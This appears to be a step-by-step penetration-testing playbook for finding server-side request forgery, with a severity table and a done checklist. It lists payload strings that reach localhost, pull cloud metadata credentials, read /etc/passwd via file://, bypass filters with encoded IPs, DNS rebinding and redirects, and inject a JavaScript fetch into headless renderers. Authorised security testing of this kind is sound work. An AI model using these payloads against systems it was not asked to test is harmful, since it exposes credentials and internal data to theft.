# Workflow 05 — Hunt SSRF

Run this on any endpoint that takes a URL, host, webhook, or file-from-URL. Time
box: 90 minutes.

---

## Step 1 — Find the sinks (15 min)

Grep the JS/docs/network for:

```
url=  uri=  link=  src=  dest=  target=  redirect=  callback=
webhook=  import=  fetch=  image=  avatar=  preview=  screenshot=
pdf=  export=  feed=  rss=  sitemap=  proxy=  oembed=  page_url=  context_url=
```

Each is a candidate. Write `sinks.tsv`: endpoint, param, method.

---

## Step 2 — Prepare a listener (5 min)

Start `interactsh` (or Burp Collaborator) and note the domain. One listener per
engagement.

---

## Step 3 — Prove the fetch (15 min)

For each sink, submit your listener URL:

```
http://<id>.oast.fun/
```

Verdicts:

- Hit with a **server** User-Agent and a datacenter IP → server-side fetch.
- Hit from your own browser IP → client-side; different bug.
- No hit → the value is stored but not fetched (common for `page_url` in
  chatbots). **Not SSRF.**

---

## Step 4 — Reach localhost (15 min)

```
http://127.0.0.1/
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://localhost/
http://[::1]/
http://0x7f000001/
http://2130706433/
http://127.1/
```

Any response that is not a fetch-error (e.g. an internal page title) is reach.
Record the exact string and the response.

---

## Step 5 — Cloud metadata (15 min)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
```

If credentials come back, **do not use them**. Redact to first/last 4 chars and
report the role.

If IMDSv2 or a header requirement blocks you, note it and try a redirect from
your listener to the metadata URL (a fetcher that follows redirects bypasses
header-only checks).

---

## Step 6 — Bypass filters (15 min)

If `127.0.0.1` and `169.254.169.254` are blocked:

- Decimal/hex/octal IP.
- DNS: `127.0.0.1.nip.io`, `127.0.0.1.sslip.io`, a rebinding service.
- Redirect: your listener 302s to the internal URL.
- `file:///etc/passwd`, `gopher://`, `dict://`.

One bypass at a time; record which worked.

---

## Step 7 — PNG/PDF generators (10 min)

A headless browser that fetches your URL runs JS. Test:

- `http://127.0.0.1:9222/json` (DevTools).
- A page with `<img src=x onerror="fetch('http://169.254.169.254/...')">`.
- `file:///etc/passwd` in an iframe + screenshot.

If the generator returns the rendered content, internal data is readable.

---

## Step 8 — Severity and report

| Shown | Severity |
|---|---|
| Listener only, public | Low/Info |
| Blind DNS, no internal reach | Medium |
| Localhost service reachable | High |
| Metadata credentials | Critical |
| Internal API with data | High/Critical |

Run `checklists/ssrf.md`. Report with the exact bypass string and the response
(or the listener hit with source IP).

---

## Definition of done

- [ ] Sinks listed.
- [ ] Fetch proven or disproven per sink.
- [ ] Localhost tested.
- [ ] Metadata tested.
- [ ] Bypasses tried if filtered.
- [ ] Evidence captured.

A `page_url` that is never fetched is **closed**. Say so; do not report it.
